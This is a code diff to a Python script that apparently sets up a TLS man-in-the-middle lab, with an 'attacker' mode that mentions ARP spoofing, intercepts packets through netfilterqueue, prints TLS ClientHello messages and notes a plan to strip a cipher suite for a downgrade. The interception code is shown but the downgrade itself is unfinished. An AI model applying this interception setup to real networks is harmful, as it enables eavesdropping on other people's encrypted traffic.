@@ -6,6 +6,7 @@ import socket
 import subprocess
 import http.client
 from time import sleep
+import cryptography
 
 import netfilterqueue
 import scapy.layers.inet
@@ -13,6 +14,7 @@ import tlslite
 from netfilterqueue import NetfilterQueue
 from scapy.layers.inet import IP
 from scapy.layers.tls.handshake import TLSClientHello, TLSServerHello
+from scapy.main import load_layer
 from tlslite import X509, X509CertChain, parsePEMKey, HandshakeSettings, SessionCache, Checker
 
 
@@ -29,12 +31,19 @@ def handler_queue_1(pkt: netfilterqueue.Packet):
 
     if scpy_pkt.haslayer(scapy.layers.inet.TCP):
         print("TCP packet received")
-        scpy_pkt.show2()
+        #scpy_pkt.show2()
         if scpy_pkt.haslayer(TLSClientHello):
             # todo: check if payload contains a TCP packet, if yes check if it contains a TLS handshake message, if not accept anyway, if yes
             # as a test, drop each packet after printing it!
-            None
-
+            print("--------------------------------------------------------------------------------")
+            print("--------------------------------------------------------------------------------")
+            print("--------------------------------------------------------------------------------")
+            print("TLS client hello captured")
+            scpy_pkt.show2()
+            print("--------------------------------------------------------------------------------")
+            print("--------------------------------------------------------------------------------")
+            print("--------------------------------------------------------------------------------")
+            #modify it to remove TLS_DHE_RSA_WITH_AES_256_CBC_SHA
         pkt.accept()
     else:
         pkt.accept()
@@ -99,7 +108,7 @@ if __name__ == '__main__':
         settings = HandshakeSettings()
         settings.cipherNames=["aes256gcm", "aes256"]
         settings.maxVersion = TLS_VERSION
-        settings.keyExchangeNames = ["rsa"]
+        settings.keyExchangeNames = ["rsa", "dhe_rsa"]
 
         try:
             conn.handshakeClientCert(chain,
@@ -156,7 +165,7 @@ if __name__ == '__main__':
         settings = HandshakeSettings()
         settings.maxVersion = TLS_VERSION
         settings.cipherNames=["aes256gcm", "aes256"]
-        settings.keyExchangeNames = ["rsa"]
+        settings.keyExchangeNames = ["rsa", "dhe_rsa"]
 
         # session cache active, so we can resume laster
         sessionCache = SessionCache()
@@ -184,6 +193,9 @@ if __name__ == '__main__':
     else:
 
         print("attacker online...")
+
+        load_layer("tls")
+
         with open("/dev/null", "wb") as fnull:
             # attacker
             # run arpspoof ASAP
